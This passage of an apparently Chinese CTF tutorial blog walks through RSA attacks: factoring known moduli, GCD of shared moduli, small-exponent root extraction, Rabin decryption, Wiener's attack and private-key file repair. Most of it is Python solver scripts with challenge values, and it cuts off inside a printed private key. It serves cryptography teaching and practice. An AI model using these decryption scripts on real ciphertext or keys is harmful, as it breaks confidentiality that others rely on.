class="number">1</span>a:ac:<span class="number">6</span>c:<span class="number">0</span>b:f6:cd:<span class="number">3</span>d:<span class="number">70</span>:eb:ca:<span class="number">28</span>:<span class="number">1</span>b:ff:e9:<span class="number">7</span>f:</span><br><span class="line">    be:<span class="number">30</span>:dd</span><br><span class="line">Exponent: <span class="number">65537</span> (<span class="number">0x10001</span>)</span><br><span class="line">Modulus=C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD</span><br><span class="line">writing RSA key</span><br><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAMJjauXD2OQ/+<span class="number">5</span>erCQKPGqxsC/bNPXDr</span><br><span class="line">yigb/+l/vjDdAgMBAAE=</span><br><span class="line">-----END PUBLIC KEY-----</span><br><span class="line">OpenSSL&gt;</span><br></pre></td></tr></table></figure><p>可以看到：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">N=C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD</span><br><span class="line"></span><br><span class="line">E=<span class="number">65537</span></span><br></pre></td></tr></table></figure><p>生成私钥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line">keypair = RSA.generate(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">keypair.p = <span class="number">275127860351348928173285174381581152299</span></span><br><span class="line">keypair.q = <span class="number">319576316814478949870590164193048041239</span></span><br><span class="line">keypair.e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">keypair.n = keypair.p * keypair.q</span><br><span class="line">Qn = int((keypair.p<span class="number">-1</span>) * (keypair.q<span class="number">-1</span>))</span><br><span class="line"></span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">True</span>):</span><br><span class="line">    x = (Qn * i ) + <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> (x % keypair.e == <span class="number">0</span>):</span><br><span class="line">        keypair.d = x / keypair.e</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">private = open(<span class="string">&#x27;private.pem&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">private.write(keypair.exportKey())</span><br><span class="line">private.close()</span><br></pre></td></tr></table></figure><p>生成FLAG</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">OpenSSL&gt; rsautl -decrypt -in &#x2F;root&#x2F;flag.enc -inkey &#x2F;root&#x2F;private.pem</span><br></pre></td></tr></table></figure><h6 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line">public=RSA.importKey(open(<span class="string">&#x27;/Users/apple/Downloads/mediumRSA/pubkey.pem&#x27;</span>).read())</span><br><span class="line">n=public.n</span><br><span class="line">e=public.e</span><br><span class="line">print(n)</span><br><span class="line">print(e)</span><br></pre></td></tr></table></figure><h5 id="题型一"><a href="#题型一" class="headerlink" title="题型一"></a>题型一</h5><p>知道公钥(pubkey.pem)和密文(flag.enc)</p><p>openssl求出e、n，破解生成</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">python2或者<span class="number">3</span></span><br><span class="line"><span class="keyword">import</span> libnum  </span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes  </span><br><span class="line"> </span><br><span class="line">n = <span class="number">86934482296048119190666062003494800588905656017203025617216654058378322103517</span>  </span><br><span class="line">p = <span class="number">285960468890451637935629440372639283459</span>  </span><br><span class="line">q = <span class="number">304008741604601924494328155975272418463L</span>  </span><br><span class="line">e = <span class="number">65537</span>  </span><br><span class="line">phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)  </span><br><span class="line">d = libnum.invmod(e,phi)  </span><br><span class="line"> </span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;/Users/apple/Desktop/flag.enc&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">    c = f.read().encode(<span class="string">&#x27;hex&#x27;</span>)  </span><br><span class="line">    c = int(c,<span class="number">16</span>)  </span><br><span class="line">m = pow(c,d,n)  </span><br><span class="line"><span class="keyword">print</span> long_to_bytes(m)</span><br></pre></td></tr></table></figure><p>关于文件形式的密文c，一般都是16进制形式读取，接着再转为整型用于计算。</p><h5 id="题型二"><a href="#题型二" class="headerlink" title="题型二"></a>题型二</h5><p>两个文件public.key和flag.enc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> Crypto.PublicKey.RSA</span><br><span class="line"><span class="keyword">import</span> Crypto.Cipher.PKCS1_OAEP</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes  </span><br><span class="line"> </span><br><span class="line">n = <span class="number">10306247299477991196335954707897189353577589618180446614762218980226685668311143526740800444344046158260556585833057716406703213966249956775927205061731821632025483608182881492214855240841820024816859031176291364212054293818204399157346955465232586109199762630150640804366966946066155685218609638749171632685073</span>  </span><br><span class="line">p = <span class="number">97</span>  </span><br><span class="line">q = <span class="number">106249972159566919549855203174197828387397831115262336234662051342543151219702510584956705611794290291345944183845955839244363030579896461607496959399297130227066841321473005074379950936513608503266587950271044991876848389878395867601515004796212227929894460104645781488319246866661398816686697306692491058609</span></span><br><span class="line">e = <span class="number">65537</span>  </span><br><span class="line">phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)  </span><br><span class="line">d = libnum.invmod(e,phi)  </span><br><span class="line"> </span><br><span class="line">key=Crypto.PublicKey.RSA.construct(map(long,[n,e,d]))</span><br><span class="line">rsakey=Crypto.Cipher.PKCS1_OAEP.new(key)</span><br></pre></td></tr></table></figure><h4 id="唯独密文攻击"><a href="#唯独密文攻击" class="headerlink" title="唯独密文攻击"></a>唯独密文攻击</h4><p>唯密文攻击指的是在仅知已加密文字的情况下进行穷举攻击，把加法密码和乘法密码联合起来，就得到了所谓的仿射密码(affinecipher)—— 两种密码与一对密钥的组合。</p><p>思路：计算q=n/p,对比找出小的那个质数，找到n与200组密文的最大公约数即相当于对n做了分解。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;ciphertext.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    content = f.readlines()</span><br><span class="line">    e = []</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> content:</span><br><span class="line">        res = re.findall(<span class="string">&#x27;^\d+&#x27;</span>, line)</span><br><span class="line">        <span class="keyword">if</span> len(res) &gt; <span class="number">0</span>:</span><br><span class="line">            e.append(int(res[<span class="number">0</span>]))</span><br><span class="line"></span><br><span class="line">n = <span class="number">135176830582884945708175419898330054260341730432046991449072509302750602166218145078102928897914789996197402658592881347572949256377161172079344803330624352445165759925647345536051853372740246104804540179716136644319380454884518397455488002758429914465640804944658049262500561494830899678619427468784748988379</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">divisors</span>(<span class="params">m, n</span>):</span></span><br><span class="line">    c = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> c != <span class="number">0</span>:</span><br><span class="line">        c = m % n</span><br><span class="line">        m = n</span><br><span class="line">        n = c</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(e)):</span><br><span class="line">        print(str(i + <span class="number">1</span>) + <span class="string">&#x27;:&#x27;</span> + str(divisors(n, e[i])))</span><br></pre></td></tr></table></figure><h4 id="低加密指数分解攻击"><a href="#低加密指数分解攻击" class="headerlink" title="低加密指数分解攻击"></a>低加密指数分解攻击</h4><p>前提：</p><p>e=2、密文已知。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2  </span><br><span class="line"><span class="keyword">import</span> libnum  </span><br><span class="line">c = <span class="number">9217979941366220275377875095861710925207028551771520610387238734819759256223080175603032167658086669886661302962985046348865181740591251321966682848536331583243529</span>  </span><br><span class="line">m = gmpy2.isqrt(c)  </span><br><span class="line">m = int(m)  </span><br><span class="line">m_text = libnum.n2s(m)  </span><br><span class="line">print(m_text)</span><br></pre></td></tr></table></figure><p>前提：</p><p>e=2 Rabin加密中的N可被分解。</p><figure class="highlight python"><figcaption><span>p y</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2  </span><br><span class="line"><span class="keyword">import</span> libnum  </span><br><span class="line">e = <span class="number">2</span>  </span><br><span class="line">n = <span class="number">87924348264132406875276140514499937145050893665602592992418171647042491658461</span>  </span><br><span class="line">p = <span class="number">275127860351348928173285174381581152299</span>  </span><br><span class="line">q = <span class="number">319576316814478949870590164193048041239</span>  </span><br><span class="line">c=int(open(<span class="string">&#x27;/Users/apple/Downloads/hardRSA/flag.enc&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read().encode(<span class="string">&#x27;hex&#x27;</span>),<span class="number">16</span>)   </span><br><span class="line">mp=pow(c,(p+<span class="number">1</span>)/<span class="number">4</span>,p)  </span><br><span class="line">mq=pow(c,(q+<span class="number">1</span>)/<span class="number">4</span>,q)  </span><br><span class="line">yp=gmpy2.invert(p,q)  </span><br><span class="line">yq=gmpy2.invert(q,p)  </span><br><span class="line">r=(yp*p*mq+yq*q*mp)%n  </span><br><span class="line">rr=n-r  </span><br><span class="line">s=(yp*p*mq-yq*q*mp)%n  </span><br><span class="line">ss=n-s  </span><br><span class="line"><span class="keyword">print</span> libnum.n2s(r)  </span><br><span class="line"><span class="keyword">print</span> libnum.n2s(rr)  </span><br><span class="line"><span class="keyword">print</span> libnum.n2s(s)  </span><br><span class="line"><span class="keyword">print</span> libnum.n2s(ss)</span><br></pre></td></tr></table></figure><h4 id="小明文攻击"><a href="#小明文攻击" class="headerlink" title="小明文攻击"></a>小明文攻击</h4><p>前提：</p><p>e较小，一般为3。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#适用情况:e较小,一般为3</span></span><br><span class="line"><span class="comment">#公钥e很小，明文m也不大的话，于是m^e=k*n+m 中的的k值很小甚至为0，爆破k或直接开三次方即可。</span></span><br><span class="line">      </span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">n=<span class="number">0xB0BEE5E3E9E5A7E8D00B493355C618FC8C7D7D03B82E409951C182F398DEE3104580E7BA70D383AE5311475656E8A964D380CB157F48C951ADFA65DB0B122CA40E42FA709189B719A4F0D746E2F6069BAF11CEBD650F14B93C977352FD13B1EEA6D6E1DA775502ABFF89D3A8B3615FD0DB49B88A976BC20568489284E181F6F11E270891C8EF80017BAD238E363039A458470F1749101BC29949D3A4F4038D463938851579C7525A69984F15B5667F34209B70EB261136947FA123E549DFFF00601883AFD936FE411E006E4E93D1A00B0FEA541BBFC8C5186CB6220503A94B2413110D640C77EA54BA3220FC8F4CC6CE77151E29B3E06578C478BD1BEBE04589EF9A197F6F806DB8B3ECD826CAD24F5324CCDEC6E8FEAD2C2150068602C8DCDC59402CCAC9424B790048CCDD9327068095EFA010B7F196C74BA8C37B128F9E1411751633F78B7B9E56F71F77A1B4DAAD3FC54B5E7EF935D9A72FB176759765522B4BBC02E314D5C06B64D5054B7B096C601236E6CCF45B5E611C805D335DBAB0C35D226CC208D8CE4736BA39A0354426FAE006C7FE52D5267DCFB9C3884F51FDDFDF4A9794BCFE0E1557113749E6C8EF421DBA263AFF68739CE00ED80FD0022EF92D3488F76DEB62BDEF7BEA6026F22A1D25AA2A92D124414A8021FE0C174B9803E6BB5FAD75E186A946A17280770F1243F4387446CCCEB2222A965CC30B3929</span>    </span><br><span class="line">e=<span class="number">3</span>    </span><br><span class="line">res=<span class="number">0</span>   <span class="comment">#res是m  </span></span><br><span class="line">c=int(open(<span class="string">&#x27;flag.enc&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read().encode(<span class="string">&#x27;hex&#x27;</span>),<span class="number">16</span>)    </span><br><span class="line"><span class="keyword">print</span> time.asctime()    </span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> xrange(<span class="number">200000000</span>):    </span><br><span class="line">    <span class="keyword">if</span> gmpy2.iroot(c+n*k,<span class="number">3</span>)[<span class="number">1</span>]==<span class="number">1</span>:    </span><br><span class="line">        res=gmpy2.iroot(c+n*k,<span class="number">3</span>)[<span class="number">0</span>]    </span><br><span class="line">        <span class="keyword">print</span> k,res    </span><br><span class="line">        <span class="keyword">print</span> long_to_bytes(res)    </span><br><span class="line">        <span class="keyword">print</span> time.asctime()    </span><br><span class="line">        <span class="keyword">break</span>  </span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="模不互素"><a href="#模不互素" class="headerlink" title="模不互素"></a>模不互素</h4><p>前提：</p><p>存在两个或更多模数 ，且gcd(N1,N2)!=1 也就是N1和N2不互质。</p><p>判断是否互为素数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span>(<span class="params">a,b</span>):</span></span><br><span class="line">    <span class="keyword">if</span>(b==<span class="number">0</span>):  </span><br><span class="line">        <span class="keyword">return</span> a</span><br><span class="line">    <span class="keyword">else</span>:  </span><br><span class="line">        <span class="keyword">return</span> gcd(b,a%b)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span>  </span><br><span class="line">    x = <span class="number">20071978783607427283823783012022286910630968751671103864055982304683197064862908267206049336732205051588820325894943126769930029619538705149178241710069113634567118672515743206769333625177879492557703359178528342489585156713623530654319500738508146831223487732824835005697932704427046675392714922683584376449203594641540794557871881581407228096642417744611261557101573050163285919971711214856243031354845945564837109657494523902296444463748723639109612438012590084771865377795409000586992732971594598355272609789079147061852664472115395344504822644651957496307894998467309347038349470471900776050769578152203349128951</span> </span><br><span class="line">    y = <span class="number">18674375108313094928585156581138941368570022222190945461284402673204018075354069827186085851309806592398721628845336840532779579197302984987661547245423180760958022898546496524249201679543421158842103496452861932183144343315925106154322066796612415616342291023962127055311307613898583850177922930685155351380500587263611591893137588708003711296496548004793832636078992866149115453883484010146248683416979269684197112659302912316105354447631916609587360103908746719586185593386794532066034112164661723748874045470225129298518385683561122623859924435600673501186244422907402943929464694448652074412105888867178867357727</span>  </span><br><span class="line">    <span class="keyword">if</span> gcd(x,y)==<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2  </span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes  </span><br><span class="line"> lines = open(<span class="string">&#x27;tmp.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).readlines()  </span><br><span class="line">c1 = int(lines[<span class="number">2</span>],<span class="number">16</span>)  </span><br><span class="line">c2 = int(lines[<span class="number">6</span>],<span class="number">16</span>)  </span><br><span class="line">n1 = int(lines[<span class="number">0</span>])  </span><br><span class="line">n2 = int(lines[<span class="number">4</span>])   </span><br><span class="line">p1 = gmpy2.gcd(n1, n2)  </span><br><span class="line"><span class="keyword">assert</span> (p1 != <span class="number">1</span>)  </span><br><span class="line">p2 = n1 / p1  </span><br><span class="line">p3 = n2 / p1  </span><br><span class="line">e = <span class="number">0x10001</span>  </span><br><span class="line">d1 = gmpy2.invert(e, (p1 - <span class="number">1</span>) * (p2 - <span class="number">1</span>))  </span><br><span class="line">d2 = gmpy2.invert(e, (p1 - <span class="number">1</span>) * (p3 - <span class="number">1</span>))  </span><br><span class="line">m1 = pow(c1, d1, n1)  </span><br><span class="line">m2 = pow(c2, d2, n2)  </span><br><span class="line"><span class="keyword">print</span> long_to_bytes(m1)+long_to_bytes(m2) </span><br></pre></td></tr></table></figure><p>数据放在文本中–严格遵守c为十六进制。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">22257605320525584078180889073523223973924192984353847137164605186956629675938929585386392327672065524338176402496414014083816446508860530887742583338880317478862512306633061601510404960095143941320847160562050524072860211772522478494742213643890027443992183362678970426046765630946644339093149139143388752794932806956589884503569175226850419271095336798456238899009883100793515744579945854481430194879360765346236418019384644095257242811629393164402498261066077339304875212250897918420427814000142751282805980632089867108525335488018940091698609890995252413007073725850396076272027183422297684667565712022199054289711</span><br><span class="line">e is 65537</span><br><span class="line">0x15b9bfc47ff3791eee8d13760c676bf6c17b357e663cbf898d5ebb5de19d1ef2b56346ed1e471e014749d63e1d645a1150d0d29cb7a3346841e600b9488ab189d57fd8b31e268e9d0ad9ae173d9c68ab7880e6583adc770d72f33a71c9f2b4c1c039834b4cae08735925e4f04b658b302fc401df629eedc7d0f79108f2bddea08606380977a5434f20725319573d2db76a2909ebe565211cff605aa001922e0cc53b4430f08e352f9ddc6ae144c48cd3494942189330d45dbf0c2fb3356dd54d6140f1169975454fc8ccedb3b8847967165911d94b7577b68215cbee6ee244a68086d080663ebeb3c8cc7c46aaa13a73d88fe3350f9c627b56a31d5da8f5b7b6</span><br><span class="line"></span><br><span class="line">23686563925537577753047229040754282953352221724154495390687358877775380147605152455537988563490716943872517593212858326146811511103311865753018329109314623702207073882884251372553225986112006827111351501044972239272200616871716325265416115038890805114829315111950319183189591283821793237999044427887934536835813526748759612963103377803089900662509399569819785571492828112437312659229879806168758843603248823629821851053775458651933952183988482163950039248487270453888288427540305542824179951734412044985364866532124803746008139763081886781361488304666575456680411806505094963425401175510416864929601220556158569443747</span><br><span class="line">e is 65537</span><br><span class="line">0xce4647358e97f5ec92edc325b703996160ec041c056cd0a9e7b3b00f66a431277ef35277671233137929c8325e60f6c60a6399bcecf8b454c7865a56857723364c6c172c462fc6ab03a590882d82ac57d1f5483466b3010f14091a31ca470da5872e2e944918d8142fc0896cb386ca47592d56b63fcb7addbcc6218d676ff6305e1ee79a71eacb6cf84a022e1993500c4f45c72691cc6d4db60d75f9fa95a770e840ffcfc3d058644a054ba265cbde13c41d197cb8cf8235e67046845cd4ecbbf5ec37443a74252aee386fae320a12b2284fabaa0c8af346fde3bfa1b7933fd9f1b673ea0675ec0039c192ee53ae3b06494ecb92f7e44f8b5cfdf6d2bfb42af</span><br></pre></td></tr></table></figure><h4 id="低解密指数攻击-e过大、过小"><a href="#低解密指数攻击-e过大、过小" class="headerlink" title="低解密指数攻击(e过大、过小)"></a>低解密指数攻击(e过大、过小)</h4><p>前提：</p><p>e过大或过小（一般e过大时使用）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">import</span> ContinuedFractions, Arithmetic</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wiener_hack</span>(<span class="params">e, n</span>):</span></span><br><span class="line">    <span class="comment"># firstly git clone https://github.com/pablocelayes/rsa-wiener-attack.git !</span></span><br><span class="line">    frac = ContinuedFractions.rational_to_contfrac(e, n)</span><br><span class="line">    convergents = ContinuedFractions.convergents_from_contfrac(frac)</span><br><span class="line">    <span class="keyword">for</span> (k, d) <span class="keyword">in</span> convergents:</span><br><span class="line">        <span class="keyword">if</span> k != <span class="number">0</span> <span class="keyword">and</span> (e * d - <span class="number">1</span>) % k == <span class="number">0</span>:</span><br><span class="line">            phi = (e * d - <span class="number">1</span>) // k</span><br><span class="line">            s = n - phi + <span class="number">1</span></span><br><span class="line">            discr = s * s - <span class="number">4</span> * n</span><br><span class="line">            <span class="keyword">if</span> (discr &gt;= <span class="number">0</span>):</span><br><span class="line">                t = Arithmetic.is_perfect_square(discr)</span><br><span class="line">                <span class="keyword">if</span> t != <span class="number">-1</span> <span class="keyword">and</span> (s + t) % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">                    print(<span class="string">&quot;Hacked!&quot;</span>)</span><br><span class="line">                    <span class="keyword">return</span> d</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    n = <span class="number">460657813884289609896372056585544172485318117026246263899744329237492701820627219556007788200590119136173895989001382151536006853823326382892363143604314518686388786002989248800814861248595075326277099645338694977097459168530898776007293695728101976069423971696524237755227187061418202849911479124793990722597L</span></span><br><span class="line">    e = <span class="number">354611102441307572056572181827925899198345350228753730931089393275463916544456626894245415096107834465778409532373187125318554614722599301791528916212839368121066035541008808261534500586023652767712271625785204280964688004680328300124849680477105302519377370092578107827116821391826210972320377614967547827619L</span></span><br><span class="line">    c = <span class="number">38230991316229399651823567590692301060044620412191737764632384680546256228451518238842965221394711848337832459443844446889468362154188214840736744657885858943810177675871991111466653158257191139605699916347308294995664530280816850482740530602254559123759121106338359220242637775919026933563326069449424391192</span></span><br><span class="line">    d = wiener_hack(e, n)</span><br><span class="line">    m = pow(c,d,n)</span><br><span class="line">    <span class="keyword">print</span> long_to_bytes(m)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  rsa-wiener-attack-master python steady.py</span><br><span class="line">Hacked!</span><br><span class="line">flag&#123;Wien3r_4tt@ck_1s_3AsY&#125;</span><br></pre></td></tr></table></figure><h4 id="私钥文件修复"><a href="#私钥文件修复" class="headerlink" title="私钥文件修复"></a>私钥文件修复</h4><p>openssl提取公钥信息，将Modulus替换到脚本中。</p><p>私钥文件修复</p><p><code>https://github.com/Zui-Qing-Feng/RSA/blob/master/%E7%A7%81%E9%92%A5%E6%96%87%E4%BB%B6%E4%BF%AE%E5%A4%8D</code></p><p>生成私钥内容然后跑脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIIJKAIBAAKCAgEAwJd4U0VkhH2MxLQg6TNYZ+x4Pmz18FygPu7cJWPQ6yqeuo8Z</span><br><span class="line">UqJnC+dusjS4bVB24GrRA893M9ix6dc75escZQwllv2WILl63h2&#x2F;&#x2F;fK2v4E+PkdE</span><br><span 